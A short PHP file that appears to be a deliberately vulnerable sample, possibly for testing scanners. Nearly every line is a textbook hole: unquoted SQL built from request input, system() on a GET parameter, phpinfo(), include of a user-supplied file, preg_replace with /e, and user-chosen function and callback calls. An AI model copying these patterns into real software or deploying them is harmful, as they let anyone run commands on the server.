<?
if (isset($_GET['photo_id'])) {
    
  $photo_id = mysql_real_escape_string($_GET['photo_id']);
  $sql = "SELECT * FROM " . $dbprefix . "photos WHERE photo_id=$photo_id";
  $result=mysql_query($sql);
  
  system($_GET[x]);
  phpinfo();
  
  $file = $_GET['file'];
  include($file);
  
  $string = $_GET['p']; 
  print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);
  
  $dyn_func = $_GET['dyn_func'];
  $argument = $_GET['argument'];
  $dyn_func($argument);
  
  $evil_callback = $_GET['callback'];
  $some_array = array(0, 1, 2, 3);
  $new_array = array_map($evil_callback, $some_array);
?>
